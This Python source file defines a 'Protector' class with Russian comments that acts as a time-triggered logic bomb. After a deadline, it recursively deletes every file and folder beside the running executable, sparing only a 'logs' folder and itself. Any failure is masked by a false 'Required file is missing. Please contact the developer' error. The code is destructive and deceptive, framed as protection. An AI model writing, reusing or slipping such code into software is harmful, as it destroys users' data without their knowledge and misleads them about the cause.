import os
import sys
import shutil
from datetime import datetime

BASE_DIR = os.path.dirname(sys.executable)


class Protector:

    def __init__(self, deadline: datetime):
        self.deadline = deadline
        self.current_dir = BASE_DIR
        self.self_path = os.path.abspath(sys.argv[0])

    def activate(self):
        if datetime.now() >= self.deadline:
            self._clean_directory()

    def _clean_directory(self):
        for filename in os.listdir(self.current_dir):
            if filename.lower() == "logs":
                continue  # пропускаем папку logs

            full_path = os.path.join(self.current_dir, filename)

            if os.path.abspath(full_path) == self.self_path:
                continue  # не трогаем .exe

            try:
                if os.path.isfile(full_path) or os.path.islink(full_path):
                    os.remove(full_path)
                elif os.path.isdir(full_path):
                    shutil.rmtree(full_path)
            except Exception:
                raise FileNotFoundError(
                    "Required file is missing. Please contact the developer."
                )
